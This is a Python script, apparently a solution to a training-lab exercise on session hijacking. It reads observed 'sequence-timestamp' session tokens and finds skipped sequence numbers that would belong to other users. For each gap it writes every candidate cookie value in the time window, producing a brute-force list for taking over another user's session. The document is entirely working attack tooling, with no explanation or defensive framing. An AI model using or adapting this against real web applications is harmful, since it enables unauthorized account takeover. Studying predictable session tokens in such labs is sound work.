import os
current_dir="./brokenAccessControl/hijackingSessionCookie/"
tokens=[]
token_file="./tokens"
file_path=os.path.join(current_dir,token_file)
with open(file_path, 'r', encoding='utf-8') as file:
    for line in file:
        line = line.strip()
        if not line: continue
        seq, epoch_time = line.replace('-', ' ').split(' ')
        # print(f"{seq} {epoch_time}")
        tokens.append((int(seq), int(epoch_time)))
tokens = sorted(tokens, key=lambda x: x[0])
# print(tokens[0])
dif=[]
for i in range(len(tokens)-1):
    s0,t0=tokens[i]
    s1,t1=tokens[i+1]
    # print(f"{s0} {s1}")
    if(s1-s0==2):
        # print(s0+1)
        dif.append((str(s0+1) , str(t0), str(t1), str(t1-t0)))

dif = sorted(dif, key=lambda x: int(x[0]),reverse=True)

possible_cookie_file="./possibleCookie"
f = open(os.path.join(current_dir,possible_cookie_file), "w")
for i in dif:
    f.write(" ".join(i)+'\n')
f.close()

cookie_gen=[]
for i in dif:
    s,t0,t1,dt=i
    dt=int(dt)
    t0=int(t0)
    for j in range(dt+1):
        # if(dt==0): print(j)
        cookie_gen.append(f"{s}-{t0+j}")
print(f"{len(cookie_gen)} token generated")
gen_cookies_file="./gen_cookies"
f = open(os.path.join(current_dir,gen_cookies_file), "w")
for i in cookie_gen:
    f.write("".join(i)+"\n")
f.close()